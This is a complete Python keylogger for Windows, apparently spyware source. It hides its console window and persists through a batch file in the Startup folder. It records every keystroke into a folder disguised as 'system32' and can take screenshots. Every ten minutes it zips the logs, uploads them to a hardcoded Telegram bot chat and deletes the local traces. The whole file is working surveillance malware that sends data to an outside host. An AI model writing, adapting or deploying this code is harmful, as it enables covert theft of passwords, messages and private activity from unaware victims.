import time
import os
import shutil
import threading 
import sys
import platform
import sqlite3
import psutil
import socket
import requests
import json
from pynput.keyboard import Listener
import logging
from threading import Timer, Thread
from PIL import ImageGrab
from mss import mss
import getpass
import win32console
from win32 import win32gui
import win32ui, win32con, win32api

USER_NAME = getpass.getuser()

def hide():
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window, 0)

def add_to_startup():
    file_path = os.path.realpath(__file__)
    bat_path = "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" % USER_NAME
    with open(os.path.join(bat_path, "open.bat"), "w+") as bat_file:
        bat_file.write(f"@echo off\nstart /b \"{file_path}\"")


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)


class Monitor:

    def _on_press(self, k):
        with open('.\\logs\\system32\\log.txt', 'a') as f:
            f.write('Log : {}\t  \t{}\n'.format(k, time.ctime()))

    def _build_logs(self):
        if not os.path.exists('.\\logs'):
            os.mkdir('.\\logs')
            os.mkdir('.\\logs\\screenshots')
            os.mkdir('.\\logs\\system32')

    def _keylogger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screenshot(self):
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))

    def _send_logs(self):
        # Telegram bot token and chat_id
        token = 'jhj3637:72jhjhkwjksjjksjl732jns'
        chat_id = '6255363636'

        # Compress the log folder
        shutil.make_archive('./logs.zip', 'zip', './logs')

        # Send the compressed log folder to Telegram
        with open('logs.zip', 'rb') as f:
            files = {'document': f}
            data = {'chat_id': chat_id}
            url = f'https://api.telegram.org/bot{token}/sendDocument'
            response = requests.post(url, data=data, files=files)
            response_json = json.loads(response.text)
            self.delete_logs()

    def delete_logs(self):
        os.remove('.\\logs.zip')
        shutil.rmtree('.\\logs')

    #interval in Seconds default is 60S ~ 1MIN
    def run(self, interval=60,log_interval=600):
        self._build_logs()
        Thread(target=self._keylogger).start()

        IntervalTimer(log_interval, self._send_logs).start()
        IntervalTimer(log_interval, self.delete_logs).start()
        IntervalTimer(interval, self._build_logs).start()

if __name__ == '__main__':
    hide()
    add_to_startup()
    mon = Monitor()
    mon.run()
